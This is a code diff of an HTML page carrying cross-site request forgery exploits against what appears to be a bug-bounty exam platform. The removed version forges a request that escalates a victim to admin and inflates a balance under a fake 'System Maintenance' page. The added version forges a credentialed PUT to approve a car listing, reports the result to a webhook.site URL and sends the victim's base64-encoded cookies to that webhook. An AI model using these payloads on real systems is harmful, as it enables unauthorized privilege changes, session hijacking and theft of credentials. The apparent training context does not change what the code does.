@@ -1,31 +1,22 @@
-<!DOCTYPE html>
 <html>
-<body>
+  <body>
     <script>
-        // 1. Target URL (Adjust this if the API path is different)
-        const targetUrl = "https://bugbounty-exam.hashacademy.co/api/v1/profile/update";
+      const carId = "69dd69884e3edba5f08f60f9";
+      const webhook = "https://webhook.site/411195ff-53bb-4984-8d9b-01cd86eb4cbb";
 
-        // 2. The Data: We are telling the server to update the user to Admin
-        const exploitData = JSON.stringify({
-            "fullName": "Saja Pwned",
-            "role": "admin",
-            "balance": 999999
-        });
+      // 1. The Exploit: Try to approve the car using the Bot's session
+      fetch(`https://api-bugbounty-exam.hashacademy.co/api/cars/${carId}`, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ "status": "active", "isActive": true }),
+        credentials: 'include'
+      }).then(response => {
+        // 2. The Callback: Tell your webhook if the exploit worked
+        fetch(`${webhook}?status=${response.status}`);
+      });
 
-        // 3. Execution: Using fetch with 'no-cors' to fire the request
-        // Even if it 'fails' due to CORS, the request still HITS the server 
-        // and executes with the Admin's cookies!
-        fetch(targetUrl, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: {
-                'Content-Type': 'text/plain' // Using text/plain to avoid preflight
-            },
-            body: exploitData
-        });
-
-        console.log("Exploit launched. Check your dashboard.");
+      // 3. The Bonus: Try to grab the Bot's cookie (if XSS is possible)
+      fetch(`${webhook}?cookie=` + btoa(document.cookie));
     </script>
-    <h1>System Maintenance in Progress...</h1>
-</body>
+  </body>
 </html>
